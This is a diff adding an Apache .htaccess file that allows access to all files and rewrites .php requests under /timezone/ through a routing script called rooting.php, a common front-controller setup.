@@ -1,0 +1,14 @@
+Order deny,allow
+Allow from all
+
+<FilesMatch "^.*(?<!\.php)$">
+	Allow from all
+</FilesMatch>
+
+<Files rooting.php >
+	Allow from all
+</Files>
+
+Options +FollowSymlinks
+RewriteEngine on
+RewriteRule (.+(?<!rooting))\.php$ /timezone/rooting.php?url=$1 [QSA] [L]
